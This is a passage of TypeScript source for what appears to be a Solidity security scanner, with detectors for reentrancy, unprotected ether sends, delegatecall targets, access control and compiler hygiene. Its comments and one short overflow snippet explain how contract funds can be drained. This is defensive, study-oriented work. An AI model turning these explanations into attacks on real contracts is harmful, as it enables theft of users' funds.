import type { AstNode, Finding, Severity } from "./types.ts";
import type { ContractModel, FnModel, ModModel, SourceModel, StateVar } from "./model.ts";
import { withAccessControlCap } from "./severity-calibration.ts";

type ExtKind =
  | "call"
  | "delegatecall"
  | "staticcall"
  | "callcode"
  | "send"
  | "transfer"
  | "erc20"
  | "member"
  | "selfdestruct";

type ExtCall = {
  kind: ExtKind;
  line: number;
  checked: boolean;
  sendsValue: boolean;
  target: string;
  targetIsParam: boolean;
  targetIsConst: boolean;
  argCount: number;
  raw: string;
  /** ERC-20 recipient (transfer/safeTransfer arg 0, transferFrom arg 1) — Fix 25. */
  recipient?: string;
  /** True when the call is the contract's own/inherited transfer/transferFrom — Fix 16. */
  ownToken?: boolean;
  /** Ether-send amount text (transfer/send arg 0, call{value:} arg) — Fix 17. */
  amount?: string;
  /** True for the synthetic call standing in for an internal callee's
   * external effects — it has no statement-level recipient/amount, so
   * it is excluded from sendDetails (Fix 17). */
  synthetic?: boolean;
};

type Flow = {
  seen: ExtCall | null;
  sawWrite: boolean;
  sawCall: boolean;
  callThenWrite: boolean;
  writeThenCall: boolean;
  /** True when the walker saw a genuine ether send: transfer/send (1-arg),
   * or call{value}. Token transfer(to, x) / super.transfer / SafeMath do
   * NOT set this — the old fn.source regex matched all three. */
  sawEtherSend: boolean;
  /** State vars written before the first external call (checks-effects order). */
  preCallWrites: Set<string>;
  /** State vars written after the first external call (the stale-read surface). */
  postCallWrites: Set<string>;
  /** Base expressions of genuine ether sends (recipients), for the
   * caller-control check in unprotected-ether. */
  sendTargets: string[];
  /** True while every genuine ether send so far is a refund: to
   * msg.sender, of an amount derived from this call's msg.value
   * (payable(msg.sender).transfer(msg.value - fee)). A refund cannot
   * drain anything — the caller only ever gets their own deposit back —
   * so it is not an open drain. Starts true (vacuous); any send whose
   * target is not msg.sender or whose amount is not msg.value-derived
   * flips it false. A refund staged through a local variable
   * (uint256 r = msg.value - fee; msg.sender.transfer(r)) is NOT
   * recognized: fail closed, the finding still fires. */
  allSendsAreRefunds: boolean;
  /** First write line per state var (Fix 12: the window close). */
  writeLines: Map<string, number>;
  /** Read lines per state var (Fix 12: demonstrated stale-read path).
   * Recorded for bare Identifier nodes that reach noteExpr — LHS
   * writes never reach noteExpr (they go to noteWrite), so a read
   * here is a genuine read, not a write. */
  readLines: Map<string, number[]>;
  /** Internal (bare-identifier) calls with their lines (Fix 12). */
  calleeCalls: { name: string; line: number }[];
  /** Genuine ether sends with their amounts (Fix 17). */
  sendDetails: { target: string; amount: string }[];
};

const ASSIGN = new Set(["=", "+=", "-=", "*=", "/=", "%=", "&=", "|=", "^=", "<<=", ">>="]);
const LOW_LEVEL = new Set(["call", "delegatecall", "staticcall", "callcode", "send", "transfer"]);
// Fix 27: receiver-hook carriers. These functions invoke an attacker
// callback on the recipient by design (ERC721/1155 receiver hooks), so
// a call to one genuinely opens a reentrancy window even when the
// callee is inherited (not in byName) or profile() does not mark it
// external (profile() only counts LOW_LEVEL calls).
const HOOK_CARRIERS = new Set([
  "_safeMint", "_safeTransfer",
  "safeTransferFrom", "safeBatchTransferFrom",
  "_checkOnERC721Received", "_checkOnERC1155Received",
]);
/**
 * Pure-arithmetic library methods (SafeMath). `balances[x].sub(wad)` is
 * arithmetic on a value, not a call to another contract — it must never
 * count as an external call, or every SafeMath transfer looks like
 * call-then-write reentrancy.
 */
const SAFE_MATH = new Set(["add", "sub", "mul", "div", "mod"]);
const BUILTIN = new Set([
  "require", "assert", "revert", "keccak256", "sha256", "ripemd160", "ecrecover",
  "addmod", "mulmod", "gasleft", "blockhash", "encode", "encodePacked",
  "encodeWithSignature", "encodeWithSelector", "encodeCall", "concat", "push", "pop",
]);

const PRIVILEGED = /^(owner|admin|governor|implementation|pendingOwner|operator|oracle|beacon|logic|feeRecipient|treasury)$/;

/**
 * Cached `new RegExp`. The detector helpers build their patterns from contract
 * identifiers, so the same pattern was compiled again on every call — and the
 * analysis is the per-address bottleneck of a large run. Compiling each distinct
 * pattern once is a cheap, behaviour-preserving win.
 *
 * Global-flag regexes are stateful (`lastIndex`), so they are never shared: a
 * cached `/g` pattern reused by `matchAll`/`test` would resume mid-string. Those
 * are constructed fresh, exactly as before.
 */
const REGEX_CACHE = new Map<string, RegExp>();
function rx(pattern: string, flags = ""): RegExp {
  if (flags.includes("g")) return new RegExp(pattern, flags);
  const key = flags ? `${flags}:${pattern}` : pattern;
  let compiled = REGEX_CACHE.get(key);
  if (!compiled) {
    // Bound the cache; patterns vary with identifiers across a long run.
    if (REGEX_CACHE.size >= 5000) REGEX_CACHE.clear();
    compiled = new RegExp(pattern, flags);
    REGEX_CACHE.set(key, compiled);
  }
  return compiled;
}

function lineOf(node: AstNode | undefined, delta: number, fallback: number): number {
  const raw = node?.loc?.start.line ?? fallback + delta;
  return Math.max(1, raw - delta);
}

function sliceOf(source: string, node: AstNode | undefined): string {
  if (!node?.range) return "";
  // @solidity-parser/parser ranges are INCLUSIVE-end: [start, end] where end
  // is the index of the last character. slice() needs end + 1, or every
  // sliced string loses its final character ("owner" -> "owne").
  return source.slice(node.range[0], node.range[1] + 1).replace(/\s+/g, " ").trim();
}

function snippet(source: string, astLine: number, delta: number): string {
  const lines = source.split("\n");
  const start = Math.max(0, astLine - 5);
  const end = Math.min(lines.length, astLine + 4);
  return lines
    .slice(start, end)
    .map((text, i) => {
      const raw = start + i + 1;
      const mark = raw === astLine ? ">" : " ";
      return `${mark} ${String(Math.max(1, raw - delta)).padStart(4, " ")}  ${text}`;
    })
    .join("\n");
}

function rootIdent(node: AstNode | undefined): string | null {
  if (!node) return null;
  if (node.type === "Identifier" && typeof node.name === "string") return node.name;
  if (node.type === "IndexAccess") return rootIdent(node.base as AstNode);
  if (node.type === "MemberAccess") return rootIdent(node.expression as AstNode);
  if (node.type === "FunctionCall") return rootIdent(node.expression as AstNode);
  if (node.type === "TupleExpression") return null;
  return null;
}

function unwrapCallee(expr: AstNode): { member: string | null; base: AstNode | null; named?: AstNode } {
  if (expr.type === "NameValueExpression") {
    const inner = expr.expression as AstNode;
    const next = unwrapCallee(inner);
    return { ...next, named: (expr.arguments as AstNode) ?? next.named };
  }
  if (expr.type === "MemberAccess") {
    return { member: String(expr.memberName ?? ""), base: expr.expression as AstNode };
  }
  if (expr.type === "Identifier") return { member: String(expr.name ?? ""), base: null };
  return { member: null, base: null };
}

function namedValue(named: AstNode | undefined, key: string): boolean {
  if (!named || !Array.isArray(named.names)) return false;
  return (named.names as string[]).includes(key);
}

/**
 * True when a modifier definition gates on the caller: its body compares
 * msg.sender / _msgSender against something, or requires on it. A modifier
 * that merely gates on state (onlyActive, onlyPaused) has no sender check
 * and is NOT access control. Returns null when the modifier is not defined
 * in this compilation (imported) — the caller falls back to the name list.
 */
/**
 * True when a value recipient / selfdestruct beneficiary is under the
 * caller's control: it is msg.sender, a function parameter, a complex
 * expression mentioning either, or a state variable this function writes
 * (so the caller can redirect it). A constant, a literal, or a state
 * variable this function does not write is FIXED — anyone can trigger the
 * send, but they cannot redirect the funds to themselves.
 */
// Fix 27/29 helper: resolve a member call's callee function via the
// base expression. The base may be a state variable (resolve via its
// declared type), a parameter (resolve via its declared type), or a
// contract type name (the type itself). Returns the callee function
// plus the contract it was found in, or undefined when unresolvable
// (plain address, msg/block/abi, unknown type).
function resolveCalleeFn(
  member: string,
  baseName: string | null,
  fn: FnModel,
  contract: ContractModel,
  model: SourceModel,
): { fn: FnModel; contractName: string } | undefined {
  if (!member || !baseName) return undefined;
  let typeName: string | undefined;
  const sv = contract.stateVars.find((v) => v.name === baseName);
  if (sv) typeName = sv.typeName.replace(/\[\]$/, "");
  else {
    const p = fn.params.find((x) => x.name === baseName);
    if (p) typeName = p.typeName.replace(/\[\]$/, "");
    else if (model.contracts.some((c) => c.name === baseName)) typeName = baseName;
  }
  if (!typeName) return undefined;
  const target = model.contracts.find((c) => c.name === typeName);
  if (!target) return undefined;
  const calleeFn = target.functions.find((f) => f.name === member);
  if (!calleeFn) return undefined;
  return { fn: calleeFn, contractName: target.name };
}

// Paren-depth scan: given the index of an opening "(", return the
// index of the matching ")" (or -1 when unbalanced).
function parenClose(src: string, openIdx: number): number {
  let depth = 0;
  for (let i = openIdx; i < src.length; i++) {
    if (src[i] === "(") depth++;
    else if (src[i] === ")") {
      depth--;
      if (depth === 0) return i;
    }
  }
  return -1;
}

// Zero-guard check (shared by the zero-address finding and Fix 28):
// the source guards `param != 0` in a require, or rejects `param == 0`
// in an if.
function hasZeroGuardFor(src: string, param: string): boolean {
  const esc = param.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
  return rx(`require\\s*\\(\\s*${esc}\\s*!=`).test(src) ||
    rx(`if\\s*\\(\\s*${esc}\\s*==\\s*(0\\b|address\\s*\\(\\s*0\\s*\\))`).test(src);
}

// Split a call argument list on top-level commas (respecting nested
// parens/brackets/braces), so positional args can be picked out.
function splitTopLevel(argsText: string): string[] {
  const out: string[] = [];
  let depth = 0;
  let cur = "";
  for (const ch of argsText) {
    if (ch === "(" || ch === "[" || ch === "{") depth++;
    else if (ch === ")" || ch === "]" || ch === "}") depth--;
    if (ch === "," && depth === 0) {
      out.push(cur);
      cur = "";
    } else cur += ch;
  }
  out.push(cur);
  return out;
}

// Fix 28: does an INTERNAL zero-address setter have a reachable
// caller that can pass zero without a gate? The setter's first
// address parameter is the value written (matches the addrWrite
// check in scanSimple); callers pass it positionally. A caller is
// gated when its own source guards its corresponding argument.
// A literal address(0) from a renounce-style caller ("renounce" in
// the name) is intentional, not a bug. A literal non-zero address
// or msg.sender can never be zero. Everything else (bare param with
// no guard, expression, storage read) can be zero — fail closed.
// No callers at all (dead code) counts as no ungated caller.
// Limitation: only function bodies are searched; a modifier calling
// the setter is not covered.
function internalZeroSetterHasUngatedCaller(
  fn: FnModel,
  contract: ContractModel,
  model: SourceModel,
): boolean {
  const paramIdx = fn.params.findIndex((p) => p.typeName === "address");
  if (paramIdx < 0) return true; // not a setter of this shape — fail closed
  const escName = fn.name.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
  const callRe = rx(`\\b${escName}\\s*\\(`, "g");
  for (const c of model.contracts) {
    for (const g of c.functions) {
      if (c.name === contract.name && g.name === fn.name) continue;
      for (const m of g.source.matchAll(callRe)) {
        const openIdx = m.index + m[0].length - 1; // the "("
        const closeIdx = parenClose(g.source, openIdx);
        if (closeIdx < 0) continue;
        const arg = (splitTopLevel(g.source.slice(openIdx + 1, closeIdx))[paramIdx] ?? "").trim();
        if (/^address\s*\(\s*0\s*\)$/.test(arg) || arg === "0") {
          if (/renounce/i.test(g.name)) continue; // intentional zeroing
          return true;
        }
        if (/^0x[0-9a-fA-F]{40}$/.test(arg)) continue; // literal non-zero
        if (/^(msg\.sender|_msgSender\(\s*\))$/.test(arg)) continue; // never zero
        const callerParam = g.params.find((p) => p.name === arg);
        if (callerParam && hasZeroGuardFor(g.source, arg)) continue; // gated
        return true; // bare ungated param, expression, or storage read
      }
    }
  }
  return false;
}

function isCallerControlled(expr: string, fn: FnModel, contract: ContractModel): boolean {
  const text = expr.trim();
  if (!text) return true; // unknown -> conservative
  if (/^0x[0-9a-fA-F]+$/.test(text)) return false; // address literal
  // Fix 13: address(this) / payable(address(this)) is the contract's own
  // address, not a caller-chosen beneficiary. Burn's constructor
  // selfdestruct(payable(address(this))) is a self-burn, not a theft.
  // Whitespace and the payable cast are normalized away; anything
  // larger (address(this).balance, a function of the address) falls
  // through to the conservative rules below.
  const squashed = text.replace(/\s+/g, "");
  if (squashed === "address(this)" || squashed === "payable(address(this))") return false;
  if (/\bmsg\.sender\b/.test(text)) return true;
  for (const p of fn.params) {
    if (p.name && rx(`\\b${p.name}\\b`).test(text)) return true;
  }
  const root = text.replace(/\[.*\]$/, "").trim();
  if (/^[A-Za-z_][A-Za-z0-9_]*$/.test(root)) {
    const v = contract.stateVars.find((s) => s.name === root);
    if (v) {
      // Fixed unless this function writes it (caller can redirect it).
      return !v.constOrImmutable && rx(`\\b${root}\\s*[-+*/%]?=`).test(fn.source);
    }
  }
  return true; // complex expression -> conservative
}

function modifierGuardsSender(name: string, contract: ContractModel, model?: SourceModel): boolean | null {
  const defs = [contract, ...(model?.contracts.filter((c) => contract.bases.includes(c.name)) ?? [])];
  let found = false;
  for (const c of defs) {
    const def = c.modifiers.find((d) => d.name === name);
    if (!def) continue;
    found = true;
    if (
      /(msg\.sender|_msgSender\s*\(\s*\))/.test(def.source) &&
      /(==|!=|require\s*\()/.test(def.source)
    ) {
      return true;
    }
  }
  return found ? false : null;
}

function isAuthed(fn: FnModel, contract?: ContractModel, model?: SourceModel, skipPerItem = false): boolean {
  // In-file modifier bodies beat names: onlyRegistrar (if (msg.sender !=
  // registrar) throw) IS access control; onlyActive (if (!active) throw)
  // is a state gate and is NOT. Only when the modifier is imported and
  // its body is invisible do we fall back to the name list.
  if (contract) {
    for (const m of fn.modifiers) {
      const guarded = modifierGuardsSender(m, contract, model);
      if (guarded === true) return true;
      if (guarded === false) continue;
      // null (imported) -> fall through to the name list below.
    }
  }
  if (fn.modifiers.some((m) => /onlyowner|onlyadmin|onlyrole|onlygovernor|onlygovernance|onlyauth|requiresauth|authorized|onlyminter|onlyoperator|onlyguardian/i.test(m))) {
    return true;
  }
  const src = fn.source;
  if (/_checkOwner\s*\(|_requireOwner\s*\(|onlyOwner\s*\(/.test(src)) return true;
  if (/msg\.sender\s*==\s*[A-Za-z_]/.test(src) && !/tx\.origin/.test(src)) return true;
  if (/require\s*\(\s*msg\.sender\s*==/.test(src)) return true;
  // Per-asset ownership: items[_itemId].owner == msg.sender or
  // ownerOf(_itemId) == msg.sender. The asset's owner is the only party
  // who may act on that asset — ERC-721 approve and marketplace
  // buyback are gated exactly this way (ItemSelling's approve and
  // buyback were flagged as unauthenticated because the existing
  // msg.sender == X line only covers the msg.sender-first order). The
  // dotted form keeps bare `owner == msg.sender` (a param named owner
  // would make the check vacuous) out. skipPerItem lets the ether
  // check keep flagging a per-item-gated FULL-balance send.
  if (!skipPerItem && isPerItemAuthed(src)) return true;
  return false;
}

// True when src gates on per-asset ownership: X.owner == msg.sender
// (any dotted owner — item.owner, items[id].owner) or
// ownerOf(...) == msg.sender. `!=` never matches: the check must be
// an equality grant, not an exclusion.
//
// Fix 26: the helper-call form also counts — a require (or if) whose
// condition calls a helper whose name signals an ownership/approval
// check with msg.sender (or _msgSender()) and a token/id argument:
// require(_isApprovedOrOwner(_msgSender(), tokenId), "...") or
// require(_isApprovedOrOwner(msg.sender, tokenId), "...") — the
// ERC721Burnable.burn shape. The pushed Fix 10 only matched direct
// ownerOf/owner comparisons, so both burn forms still flagged. The
// helper must be called inside a require/if guard (not merely
// mentioned), and it must take a second argument (the token/id) after
// the sender argument, so a bare _isApprovedOrOwner(msg.sender) call
// with no asset does not count as per-item auth.
function isPerItemAuthed(src: string): boolean {
  if (/[A-Za-z_][\w.[\]]*\.owner\s*==\s*msg\.sender/.test(src) || /\bownerOf\s*\([^)]*\)\s*==\s*msg\.sender/.test(src)) return true;
  // Guard spans: the condition text of every require(...) / if(...)
  // in the source, found by paren-depth scan so nested calls (e.g.
  // _msgSender() inside the helper's own argument list) do not cut
  // the span short.
  const spans: string[] = [];
  for (const m of src.matchAll(/\b(?:require|if)\s*\(/g)) {
    let depth = 1;
    let i = m.index! + m[0].length;
    while (i < src.length && depth > 0) {
      if (src[i] === "(") depth += 1;
      else if (src[i] === ")") depth -= 1;
      i += 1;
    }
    spans.push(src.slice(m.index! + m[0].length, i - 1));
  }
  for (const span of spans) {
    const nameRe = /\b\w*(ApprovedOrOwner|isOwner|isApproved)\w*\s*\(/gi;
    let nm: RegExpExecArray | null;
    while ((nm = nameRe.exec(span)) !== null) {
      const rest = span.slice(nm.index + nm[0].length - 1);
      const sender = rest.search(/msg\.sender|_msgSender\s*\(/);
      if (sender < 0) continue;
      // A comma AFTER the sender argument means a second (token/id)
      // argument follows — this is a per-item check, not a global one.
      if (rest.indexOf(",", sender) >= 0) return true;
    }
  }
  return false;
}

function hasGuard(fn: FnModel): boolean {
  return fn.modifiers.some((m) => /nonreentrant|noreentrant|reentrancyguard/i.test(m));
}

/**
 * True when the function body unconditionally reverts: the first
 * statement is revert(...) / require(false) / assert(false), so no call
 * can ever execute past it. StarkWare's Proxy.initialize is exactly
 * this — a revert-only guard function that exists so upgradeTo can
 * delegatecall the implementation's initialize by selector. Flagging it
 * "callable by anyone" is a false positive: nobody can call it
 * successfully at all.
 */
function alwaysReverts(fnSrc: string): boolean {
  const clean = fnSrc
    .replace(/\/\/[^\n]*/g, "")
    .replace(/\/\*[\s\S]*?\*\//g, "");
  const brace = clean.indexOf("{");
  if (brace === -1) return false;
  const body = clean.slice(brace + 1).trimStart();
  return /^(revert\s*\(|require\s*\(\s*false\b|assert\s*\(\s*false\b)/.test(body);
}

function escapeRegExp(s: string): string {
  return s.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
}

/**
 * True when a delegatecall target parameter is constrained by stored
 * state, not freely chosen by the caller at call time. Two shapes:
 *
 * - Direct: a require reads a mapping keyed by the target itself:
 *   require(allowlist[target]).
 * - Derived (StarkWare upgradeTo): the target flows through assignments
 *   (implVectorHash = keccak256(abi.encode(newImplementation, ...));
 *   activationTime = enabledTime[implVectorHash]), a require mentions a
 *   derived identifier (activationTime > 0, activationTime <=
 *   block.timestamp), and a mapping is keyed by a derived identifier.
 *   The fixpoint follows the assignment chain transitively.
 *
 * Fails closed: anything it cannot prove constrained stays flagged.
 */
function delegateTargetIsConstrained(fnSrc: string, targetParam: string): boolean {
  const clean = fnSrc
    .replace(/\/\/[^\n]*/g, "")
    .replace(/\/\*[\s\S]*?\*\//g, "");
  const esc = escapeRegExp(targetParam);
  // Direct: require(...) reads a mapping keyed by the target itself.
  if (rx(`require\\s*\\([^)]*\\[[^\\]]*\\b${esc}\\b[^\\]]*\\]`).test(clean)) return true;
  // Derived: fixpoint over assignments mentioning the target or a
  // previously derived identifier.
  const derived = new Set<string>();
  let grew = true;
  while (grew) {
    grew = false;
    const known = [targetParam, ...derived].map(escapeRegExp).join("|");
    const assignRe = rx(`\\b([A-Za-z_]\\w*)\\s*=(?!=)[^;=]*\\b(?:${known})\\b`, "g");
    let m: RegExpExecArray | null;
    while ((m = assignRe.exec(clean)) !== null) {
      if (m[1] !== targetParam && !derived.has(m[1])) {
        derived.add(m[1]);
        grew = true;
      }
    }
  }
  if (derived.size === 0) return false;
  const names = [...derived].map(escapeRegExp).join("|");
  const requireMentionsDerived = rx(`require\\s*\\([^)]*\\b(?:${names})\\b`).test(clean);
  const mappingKeyedByDerived = rx(`\\[[^\\]]*\\b(?:${names})\\b[^\\]]*\\]`).test(clean);
  return requireMentionsDerived && mappingKeyedByDerived;
}

/**
 * True when the function pays out of a credited balance it is entitled to
 * spend: it DEBITS a per-user credit mapping, and either the debited
 * account is msg.sender itself, or an allowance check proves msg.sender
 * may spend that account's credit (the transferFrom shape). Such a send
 * is a withdrawal / authorized transfer of credited funds, not an
 * unprotected drain — the debit IS the access check.
 *
 * A mere require bound (require(balanceOf[msg.sender] >= x)) with NO
 * debit does NOT exempt: the caller could repeat the send without ever
 * losing credit. A debit of someone else's balance with NO allowance
 * check is still flagged. This replaces the old usesCredit exemption,
 * which exempted any function that merely mentioned a balance mapping.
 */
/** Upgrade entry points whose whole job is to point a proxy at a new
 * implementation. On a proxy-shaped contract this is the standard
 * surface, not an anomaly (Fix 36). */
const PROXY_UPGRADE_FNS = new Set(["upgradeTo", "upgradeToAndCall", "setImplementation", "_setImplementation"]);

/**
 * True when the contract ITSELF is a proxy — as opposed to an
 * upgradeable implementation. Initializable / UUPSUpgradeable bases
 * live in the implementation, so an "upgradeable" base alone does NOT
 * count. Signals, any one sufficient:
 * - the name says proxy (TransparentUpgradeableProxy,
 *   InitializableAdminUpgradeabilityProxy, ERC1967Proxy, ...);
 * - a base is a proxy base (Proxy, ERC1967Proxy,
 *   BaseAdminUpgradeabilityProxy, ...);
 * - a fallback that delegatecalls, together with the EIP-1967
 *   implementation slot constant or an implementation state variable
 *   (the dispatch shape).
 */
function isProxyShape(contract: ContractModel): boolean {
  if (/proxy/i.test(contract.name)) return true;
  if (contract.bases.some((b) => /proxy|erc1967/i.test(b))) return true;
  const hasFallbackDelegatecall = contract.functions.some((f) => f.isFallback && /delegatecall/.test(f.source));
  if (!hasFallbackDelegatecall) return false;
  const hasImplSlot = contract.functions.some((f) =>
    f.source.includes("360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc"),
  );
  const hasImplVar = contract.stateVars.some((v) => /^(implementation|_implementation|impl)$/i.test(v.name));
  return hasImplSlot || hasImplVar;
}

/**
 * Source of fn plus every internal function it transitively calls (via
 * the direct call graph). Payout bounds and debits often live in an
 * internal helper (processClaim) rather than the entry function, so a
 * check that only reads fn.source misses them.
 */
function transitiveSources(
  fn: FnModel,
  byName: Map<string, FnModel>,
  direct: Map<string, { writes: Set<string>; external: boolean; callees: Set<string>; externalKinds: Set<string> }>,
): string {
  const seen = new Set<string>([fn.name]);
  const queue = [fn.name];
  const parts = [fn.source];
  while (queue.length) {
    const name = queue.shift()!;
    for (const callee of direct.get(name)?.callees ?? []) {
      if (seen.has(callee)) continue;
      seen.add(callee);
      queue.push(callee);
      const calleeFn = byName.get(callee);
      if (calleeFn) parts.push(calleeFn.source);
    }
  }
  return parts.join("\n");
}

/**
 * A payout is Merkle-bounded when (a) the payout path verifies a Merkle
 * proof binding (recipient, amount), (b) the recipient is exactly
 * msg.sender (not a caller-supplied address), and (c) a per-user
 * accumulator caps repeat claims (claimed[x] + amt > allocation reverts,
 * or a claimed[x] guard). Then the payout is the caller's own proven
 * entitlement, not an open drain. All three must hold: a Merkle proof
 * with no double-claim guard, or a Merkle proof paying a param address,
 * is still drainable.
 */
function isMerkleBoundedPayout(
  fn: FnModel,
  sendTargets: string[],
  transitiveSrc: string,
): boolean {
  if (!/MerkleProof\s*\.\s*verify\s*\(/.test(transitiveSrc)) return false;
  const recipientIsSender = sendTargets.some((t) => {
    const target = t.trim();
    if (target === "msg.sender") return true;
    const ident = target.replace(/[^A-Za-z0-9_$]/g, "");
    if (!ident) return false;
    return rx(`\\b${ident}\\s*=\\s*msg\\.sender\\b`).test(fn.source);
  });
  if (!recipientIsSender) return false;
  return (
    /\w+\s*\[\s*[\w.]+\s*\]\s*\+\s*\w+\s*>/.test(transitiveSrc) ||
    /require\s*\(\s*!\s*\w*claimed\w*\s*\[/.test(transitiveSrc)
  );
}

function debitsOwnCredit(fn: FnModel, source?: string): boolean {
  const src = source ?? fn.source;
  // Fix 22: a cross-contract burn of the caller's own tokens
  // (token.burnAll(msg.sender) / burnFrom(msg.sender, ...) /
  // burn(msg.sender, ...)) is a per-user debit — StakeWar's payout
  // burns ALL the caller's bonds before paying them. A bare
  // token.burn(amount) is NOT a debit of the caller: it burns the
  // calling contract's own tokens (msg.sender to the token is this
  // contract), so it does not count.
  if (/\.(burn|burnFrom|burnAll)\s*\(\s*msg\.sender\b/.test(src)) return true;
  // Credit mappings: balance-family names match by content — usersBalance,
  // tokenBalanceLedger_, balances, _balances, balanceOf are all balance
  // accounting (the ERC721Token withdrawUsers FP: usersBalance[msg.sender]
  // = 0 is a full debit, but the old list missed the name). Dividend /
  // payout accounting (payoutsTo_ += marks dividends paid, claimed[x] =
  // true closes a claim) matches by name. `claimed` stays \b-anchored so
  // `unclaimed` (an accrual mapping) does not match it.
  const credit = "(?:[\\w]*[Bb]alance[\\w]*|[\\w]*deposits|[\\w]*credits|[\\w]*payoutsTo_?|\\bpaidOut|\\bclaimed|\\bwithdrawn)";
  const debit = src.match(rx(`${credit}\\s*\\[\\s*([\\w.]+)\\s*\\]\\s*[-+*/%]?=`));
  if (!debit) return false;
  const account = debit[1];
  if (account === "msg.sender") return true;
  // The debited account may be a local assigned from msg.sender
  // (DailyDivs withdraw: `address _customerAddress = msg.sender`).
  if (rx(`\\b${escapeRegExp(account)}\\s*=\\s*msg\\.sender\\b`).test(src)) return true;
  return rx(`allowance\\s*\\[\\s*${account}\\s*\\]\\s*\\[\\s*msg\\.sender\\s*\\]\\s*>=`).test(src);
}

/** Report cap: beyond this the least-severe findings are dropped (visibly). */
export const MAX_FINDINGS = 40;

let seq = 0;
function make(
  partial: Omit<Finding, "id">,
): Finding {
  seq += 1;
  return { id: `s${seq}`, ...partial };
}

export function detectSource(model: SourceModel, displaySource: string, onlyContract?: string | null): Finding[] {
  seq = 0;
  const findings: Finding[] = [];
  const seen = new Set<string>();
  const push = (f: Finding) => {
    const key = `${f.detector}|${f.locationFn}|${f.locationLine}|${f.title}`;
    if (seen.has(key)) return;
    seen.add(key);
    findings.push(f);
  };

  const parsed = model.parsedSource;
  const delta = model.lineDelta;

  // When the caller knows which contract is deployed at the address (e.g.
  // Sourcify single-file match: Deed.sol -> contract Deed), scope
  // contract-level findings to it AND its inherited bases (their code IS
  // the deployed contract: TetherToken inherits Ownable, so Ownable's
  // transferOwnership finding belongs to the USDT address). A sibling
  // contract in the same file (the Registrar in Deed.sol) is NOT a base,
  // so its bugs are not attributed to the Deed address. If the name
  // matches no contract, fall back to all contracts (previous behavior).
  // File-level findings (pragma, compiler, RTL) still apply to the file.
  const scopedContracts = (() => {
    if (!onlyContract) return model.contracts;
    const target = model.contracts.find((c) => c.name === onlyContract);
    if (!target) return model.contracts;
    const keep = new Set<string>([target.name]);
    const queue = [target];
    while (queue.length) {
      const cur = queue.pop()!;
      for (const b of cur.bases) {
        if (keep.has(b)) continue;
        keep.add(b);
        const base = model.contracts.find((c) => c.name === b);
        if (base) queue.push(base);
      }
    }
    return model.contracts.filter((c) => keep.has(c.name));
  })();

  if (/[\u202A-\u202E\u2066-\u2069]/.test(displaySource)) {
    push(make({
      severity: "high",
      swc: "SWC-130",
      title: "Bidirectional-override characters in the source",
      confidence: "high",
      detector: "rtl-override",
      summary: "The paste contains Unicode bidi overrides (U+202A–U+202E or isolates). They can make a reviewer read an address or a name backwards.",
      walkthrough: "1. Strip the source to ASCII and re-read every address literal.\n2. A right-to-left override inside a comment or string can hide the real callee.",
      exploitSolidity: "",
      remediationSolidity: "// Reject the file. Re-type literals by hand from a known-good copy.",
      locationFn: null,
      locationLine: null,
      snippet: "",
    }));
  }

  if (model.floatingPragma && model.pragma) {
    push(make({
      severity: "low",
      swc: "SWC-103",
      title: "Floating pragma",
      confidence: "high",
      detector: "floating-pragma",
      summary: `Pragma \`${model.pragma}\` does not pin a compiler. A later solc in that range can change bytecode, metadata, or bug exposure.`,
      walkthrough: "1. Floating constraints (^, >=, <) let the build pick whatever solc the environment has.\n2. Pin the exact version you audited, and commit the compiler settings.",
      exploitSolidity: "",
      remediationSolidity: `pragma solidity ${model.versionFloor ? formatVer(model.versionFloor) : "0.8.24"};`,
      locationFn: null,
      locationLine: 1,
      snippet: snippet(parsed, 1 + delta, delta),
    }));
  }

  if (model.versionFloor !== null && model.versionFloor < 8_000) {
    push(make({
      severity: "low",
      swc: "SWC-101",
      title: "Compiler is older than 0.8.0",
      confidence: "high",
      detector: "old-compiler",
      summary: "Solidity before 0.8.0 does not revert on overflow or underflow. The version alone exploits nothing: the risk is unchecked arithmetic, which is covered by its own findings, and SafeMath mitigates it. This is a toolchain-hygiene note, not a vulnerability — it was scored high and inflated every pre-0.8 contract (FomoXP, EtherFlip).",
      walkthrough: [
        "1. `balances[msg.sender] += msg.value` wraps at 2^256-1.",
        "2. A balance near the max, plus a small deposit, becomes a tiny balance and breaks the invariant.",
        "3. Underflow on a subtraction is the usual stolen-credit path: `0 - 1` becomes the maximum uint.",
      ].join("\n"),
      exploitSolidity: `// 0.7.6 arithmetic
uint256 credit = type(uint256).max - 1;
credit += 2; // equals 1. The deposit was not rejected.`,
      remediationSolidity: "pragma solidity ^0.8.24;\n// or wrap every balance update in SafeMath on 0.7.x",
      locationFn: null,
      locationLine: 1,
      snippet: "",
    }));
  }

  if (model.versionFloor !== null && model.versionFloor < 5_000) {
    const defaults = scopedContracts.flatMap((c) => c.functions.filter((f) => f.visibility === "default" && !f.isConstructor));
    if (defaults.length) {
      push(make({
        severity: "low",
        swc: "SWC-100",
        title: "Functions default to public",
        confidence: "high",
        detector: "default-visibility",
        summary: `Before 0.5.0 a function with no visibility is public. ${defaults.map((f) => f.name).join(", ")} ${defaults.length === 1 ? "is" : "are"} callable by anyone. Most such functions are intentionally public — this is a declare-your-visibility hygiene note. It is only a vulnerability if a function was meant to be internal, which the detector cannot tell from the source alone.`,
        walkthrough: "1. The compiler treats the missing keyword as public, not internal.\n2. A helper that moves ether or sets storage is then an external entrypoint.",
        exploitSolidity: "",
        remediationSolidity: "function helper() internal { /* ... */ }",
        locationFn: defaults[0]?.name ?? null,
        locationLine: defaults[0]?.line ?? null,
        snippet: "",
      }));
    }
  }

  for (const contract of scopedContracts) {
    if (contract.kind === "interface") continue;
    scanContract(contract, model, parsed, delta, push);
  }

  const rank: Record<Severity, number> = { critical: 0, high: 1, medium: 2, low: 3, info: 4 };
  findings.sort((a, b) => rank[a.severity] - rank[b.severity] || (a.locationLine ?? 0) - (b.locationLine ?? 0));
  // The cap drops the LEAST severe first (the sort above), but it used to drop
  // them SILENTLY — so a report could quietly lose real lower-severity positives
  // with no trace. The omitted count is now an explicit INFO finding, so the
  // truncation is visible and reviewable instead of invisible.
  if (findings.length <= MAX_FINDINGS) return findings;
  const omitted = findings.length - MAX_FINDINGS;
  const kept = findings.slice(0, MAX_FINDINGS);
  kept.push(
    make({
      severity: "info",
      swc: null,
      title: `${omitted} lower-severity finding${omitted === 1 ? "" : "s"} omitted (report cap ${MAX_FINDINGS})`,
      confidence: "high",
      detector: "report-cap",
